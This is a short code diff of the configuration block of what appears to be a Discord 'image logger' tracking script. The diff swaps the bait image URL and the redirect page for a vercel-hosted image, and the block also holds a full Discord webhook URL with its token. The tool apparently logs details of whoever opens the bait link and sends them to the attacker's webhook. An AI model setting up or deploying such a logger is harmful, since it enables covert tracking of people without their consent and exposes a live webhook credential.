@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1469907388789166173/Hbj4ITpDHsZVnraf0LwB8uYMV7IeRkfd8l1G5V3Oc638TqG7YIReCPbG-VDcky40WCmf",
-    "image": "https://media.discordapp.net/attachments/1465578634805772438/1469906568538493152/image.png?ex=69895cab&is=69880b2b&hm=17d8fde925dbb6a733a7b4bc40f3c0c6f0a84ee5e36e07bf5505583fdcd4ad84&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://pruebasares.vercel.app/232546.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://pruebasares.vercel.app/232546.png" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
